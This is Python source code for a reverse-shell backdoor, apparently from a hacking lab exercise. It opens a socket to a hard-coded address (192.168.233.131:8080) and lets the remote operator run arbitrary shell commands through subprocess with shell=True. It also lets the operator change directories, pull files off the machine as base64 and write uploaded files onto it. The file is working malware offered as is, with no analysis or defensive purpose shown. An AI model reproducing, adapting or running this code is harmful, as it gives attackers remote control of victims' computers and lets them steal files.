import subprocess
import os
import socket
import base64
from colored import fg
import simplejson
class Backdoor():
	def __init__(self,ip,port):
		self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.connection.connect((ip,port))
	def json_send(self,data):
		json_data=simplejson.dumps(data)
		self.connection.send(json_data.encode("utf-8"))
	def json_recv(self):
		json_data=""
		while True:
			try:
				json_data=json_data+self.connection.recv(1024).decode()
				return simplejson.loads(json_data)
			except ValueError:
				continue
	def command_exe(self,command):
		return subprocess.check_output(command,shell=True)
	def cd_command(self,directory):
		try:
			os.chdir(directory)
			return fg("green")+"[+] Your Directory changed to ==> "+fg("white")+directory
		except:
			return fg("red")+"[-] Your Directory Didn't changed!!!"+fg("white")
	def download_command(self,path):
		with open(path,"rb") as file:
			return base64.b64encode(file.read())
	def upload_command(self,path,content):
		with open(path,"wb") as file:
			file.write(base64.b64decode(content))
			return fg("green")+"[+] Uploading File: "+fg("white")+path+fg("green")+" Is Completed!"+fg("white")
	
	def execute_backdoor(self):
		while True:
			try:
				command=self.json_recv()
				if command[0]=="quit" and len(command)==1:
					self.connection.close()
					exit()
				elif command[0]=="cd" and len(command)>1:
					result=self.cd_command(command[1])
				elif command[0]=="download" and len(command)>1:
					result=self.download_command(command[1])
				elif command[0]=="upload" and len(command) >2:
					result=self.upload_command(command[1],command[2])
				else:
					result=self.command_exe(command)
			except:
				result=fg("red")+"[-] Check Your Command!"+fg("white")
			self.json_send(result)
		self.connection.close()
backdoor=Backdoor("192.168.233.131",8080)
backdoor.execute_backdoor()
